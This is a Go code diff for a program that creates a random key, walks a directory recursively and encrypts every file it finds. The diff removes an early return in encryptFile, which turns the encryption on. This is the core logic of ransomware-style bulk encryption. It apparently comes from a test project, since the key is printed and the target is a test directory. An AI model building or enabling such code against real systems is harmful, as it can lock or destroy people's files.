@@ -33,11 +33,6 @@ func main() {
 		os.Exit(1)
 	}
 
-	//files, err := os.ReadDir(testdir)
-	//if err != nil {
-	//	fmt.Println("ERROR: ", err)
-	//	os.Exit(1)
-	//}
 	traverseFiles(testdir)
 }
 
@@ -46,18 +41,10 @@ func genKey() error {
 	_, err := rand.Read(key)
 
 	fmt.Println("key ", key)
-	fmt.Printf("%x", key)
+	fmt.Printf("%x ", key)
 	return err
 }
 
-//func dirRecurse(dirname os.DirEntry, base string) {
-//	files, err := os.ReadDir(base)
-//	if err != nil {
-//		fmt.Println(err)
-//		os.Exit(1)
-//	}
-//	traverseFiles(files, base)
-//}
 
 func traverseFiles(path string) {
 	var dirs []string
@@ -70,29 +57,22 @@ func traverseFiles(path string) {
 
 	for _, file := range files {
 		if file.IsDir() {
-			//fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
-			//fmt.Println("traverseFiles read dir path: ", base + fileSep + file.Name())
 			base := path + fileSep + file.Name()
 			dirs = append(dirs, base)
 			fmt.Println("dir path: ", base)
-			//dirRecurse(file, base, fileSep)
 		} else {
-			//fmt.Println("traverseFiles read file path: ", base + fileSep + file.Name())
 			base := path + fileSep + file.Name()
-			fmt.Println("file path: ", base)
 			
 			fmt.Println("file to enc: ", base)
 			encryptFile(base)
 		}
 	}
 	for _, dir := range dirs {
-		fmt.Println("second step dir: ", dir)
 		traverseFiles(dir)
 	}
 }
 
 func encryptFile(path string) {
-	return
 	data, err := os.ReadFile(path)
 	if err != nil {
 		fmt.Println(err)
